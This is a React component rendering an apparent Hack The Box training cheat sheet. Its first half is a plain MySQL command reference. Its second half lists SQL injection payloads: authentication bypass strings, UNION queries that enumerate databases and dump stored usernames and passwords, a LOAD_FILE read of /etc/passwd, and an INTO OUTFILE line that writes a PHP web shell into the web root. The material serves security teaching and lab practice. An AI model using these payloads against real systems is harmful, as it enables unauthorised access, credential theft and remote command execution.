const HTBMySQL = () => {

    return(  <section class="modal-body">
        <div class="text-center text-break">
        <h5><i class="fad fa-file-alt"></i>&nbsp; Cheat Sheet</h5>
        <h1>The cheat sheet is a useful command reference for MySQL.</h1>
        <div class="table-responsive"><table class="table table-striped text-left">
        <thead>
        <tr>
        <th><strong>Command</strong></th>
        <th><strong>Description</strong></th>
        </tr>
        </thead>
        <tbody>
        <tr>
        <td><strong>General</strong></td>
        <td></td>
        </tr>
        <tr>
        <td><code>mysql -u root -h docker.hackthebox.eu -P 3306 -p</code></td>
        <td>login to mysql database</td>
        </tr>
        <tr>
        <td><code>SHOW DATABASES</code></td>
        <td>List available databases</td>
        </tr>
        <tr>
        <td><code>USE users</code></td>
        <td>Switch to database</td>
        </tr>
        <tr>
        <td><strong>Tables</strong></td>
        <td></td>
        </tr>
        <tr>
        <td><code>CREATE TABLE logins (id INT, ...)</code></td>
        <td>Add a new table</td>
        </tr>
        <tr>
        <td><code>SHOW TABLES</code></td>
        <td>List available tables in current database</td>
        </tr>
        <tr>
        <td><code>DESCRIBE logins</code></td>
        <td>Show table properties and columns</td>
        </tr>
        <tr>
        <td><code>INSERT INTO table_name VALUES (value_1,..)</code></td>
        <td>Add values to table</td>
        </tr>
        <tr>
        <td><code>INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)</code></td>
        <td>Add values to specific columns in a table</td>
        </tr>
        <tr>
        <td><code>UPDATE table_name SET column1=newvalue1, ... WHERE &lt;condition&gt;</code></td>
        <td>Update table values</td>
        </tr>
        <tr>
        <td><strong>Columns</strong></td>
        <td></td>
        </tr>
        <tr>
        <td><code>SELECT * FROM table_name</code></td>
        <td>Show all columns in a table</td>
        </tr>
        <tr>
        <td><code>SELECT column1, column2 FROM table_name</code></td>
        <td>Show specific columns in a table</td>
        </tr>
        <tr>
        <td><code>DROP TABLE logins</code></td>
        <td>Delete a table</td>
        </tr>
        <tr>
        <td><code>ALTER TABLE logins ADD newColumn INT</code></td>
        <td>Add new column</td>
        </tr>
        <tr>
        <td><code>ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn</code></td>
        <td>Rename column</td>
        </tr>
        <tr>
        <td><code>ALTER TABLE logins MODIFY oldColumn DATE</code></td>
        <td>Change column datatype</td>
        </tr>
        <tr>
        <td><code>ALTER TABLE logins DROP oldColumn</code></td>
        <td>Delete column</td>
        </tr>
        <tr>
        <td><strong>Output</strong></td>
        <td></td>
        </tr>
        <tr>
        <td><code>SELECT * FROM logins ORDER BY column_1</code></td>
        <td>Sort by column</td>
        </tr>
        <tr>
        <td><code>SELECT * FROM logins ORDER BY column_1 DESC</code></td>
        <td>Sort by column in descending order</td>
        </tr>
        <tr>
        <td><code>SELECT * FROM logins ORDER BY column_1 DESC, id ASC</code></td>
        <td>Sort by two-columns</td>
        </tr>
        <tr>
        <td><code>SELECT * FROM logins LIMIT 2</code></td>
        <td>Only show first two results</td>
        </tr>
        <tr>
        <td><code>SELECT * FROM logins LIMIT 1, 2</code></td>
        <td>Only show first two results starting from index 2</td>
        </tr>
        <tr>
        <td><code>SELECT * FROM table_name WHERE &lt;condition&gt;</code></td>
        <td>List results that meet a condition</td>
        </tr>
        <tr>
        <td><code>SELECT * FROM logins WHERE username LIKE 'admin%'</code></td>
        <td>List results where the name is similar to a given string</td>
        </tr>
        </tbody>
        </table></div>
        <h2>MySQL Operator Precedence</h2>
        <ul>
        <li>Division (<code>/</code>), Multiplication (<code>*</code>), and Modulus (<code>%</code>)</li>
        <li>Addition (<code>+</code>) and Subtraction (<code>-</code>)</li>
        <li>Comparison (<code>=</code>, <code>&gt;</code>, <code>&lt;</code>, <code>&lt;=</code>, <code>&gt;=</code>, <code>!=</code>, <code>LIKE</code>)</li>
        <li>NOT (<code>!</code>)</li>
        <li>AND (<code>&amp;&amp;</code>)</li>
        <li>OR (<code>||</code>)</li>
        </ul>
        <h2>SQL Injection</h2>
        <div class="table-responsive"><table class="table table-striped text-left">
        <thead>
        <tr>
        <th><strong>Payload</strong></th>
        <th><strong>Description</strong></th>
        </tr>
        </thead>
        <tbody>
        <tr>
        <td><strong>Auth Bypass</strong></td>
        <td></td>
        </tr>
        <tr>
        <td><code>admin' or '1'='1</code></td>
        <td>Basic Auth Bypass</td>
        </tr>
        <tr>
        <td><code>admin')-- -</code></td>
        <td>Basic Auth Bypass With comments</td>
        </tr>
        <tr>
        <td><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass">Auth Bypass Payloads</a></td>
        <td></td>
        </tr>
        <tr>
        <td><strong>Union Injection</strong></td>
        <td></td>
        </tr>
        <tr>
        <td><code>' order by 1-- -</code></td>
        <td>Detect number of columns using <code>order by</code></td>
        </tr>
        <tr>
        <td><code>cn' UNION select 1,2,3-- -</code></td>
        <td>Detect number of columns using Union injection</td>
        </tr>
        <tr>
        <td><code>cn' UNION select 1,@@version,3,4-- -</code></td>
        <td>Basic Union injection</td>
        </tr>
        <tr>
        <td><code>UNION select username, 2, 3, 4 from passwords-- -</code></td>
        <td>Union injection for 4 columns</td>
        </tr>
        <tr>
        <td><strong>DB Enumeration</strong></td>
        <td></td>
        </tr>
        <tr>
        <td><code>SELECT @@version</code></td>
        <td>Fingerprint MySQL with query output</td>
        </tr>
        <tr>
        <td><code>SELECT SLEEP(5)</code></td>
        <td>Fingerprint MySQL with no output</td>
        </tr>
        <tr>
        <td><code>cn' UNION select 1,database(),2,3-- -</code></td>
        <td>Current database name</td>
        </tr>
        <tr>
        <td><code>cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -</code></td>
        <td>List all databases</td>
        </tr>
        <tr>
        <td><code>cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -</code></td>
        <td>List all tables in a specific database</td>
        </tr>
        <tr>
        <td><code>cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -</code></td>
        <td>List all columns in a specific table</td>
        </tr>
        <tr>
        <td><code>cn' UNION select 1, username, password, 4 from dev.credentials-- -</code></td>
        <td>Dump data from a table in another database</td>
        </tr>
        <tr>
        <td><strong>Privileges</strong></td>
        <td></td>
        </tr>
        <tr>
        <td><code>cn' UNION SELECT 1, user(), 3, 4-- -</code></td>
        <td>Find current user</td>
        </tr>
        <tr>
        <td><code>cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -</code></td>
        <td>Find if user has admin privileges</td>
        </tr>
        <tr>
        <td><code>cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -</code></td>
        <td>Find if all user privileges</td>
        </tr>
        <tr>
        <td><code>cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -</code></td>
        <td>Find which directories can be accessed through MySQL</td>
        </tr>
        <tr>
        <td><strong>File Injection</strong></td>
        <td></td>
        </tr>
        <tr>
        <td><code>cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -</code></td>
        <td>Read local file</td>
        </tr>
        <tr>
        <td><code>select 'file written successfully!' into outfile '/var/www/html/proof.txt'</code></td>
        <td>Write a string to a local file</td>
        </tr>
        <tr>
        <td><code>cn' union select "",'&lt;?php system($_REQUEST[0]); ?&gt;', "", "" into outfile '/var/www/html/shell.php'-- -</code></td>
        <td>Write a web shell into the base web directory</td>
        </tr>
        </tbody>
        </table></div>
        </div>
        </section>  )
}

export default HTBMySQL;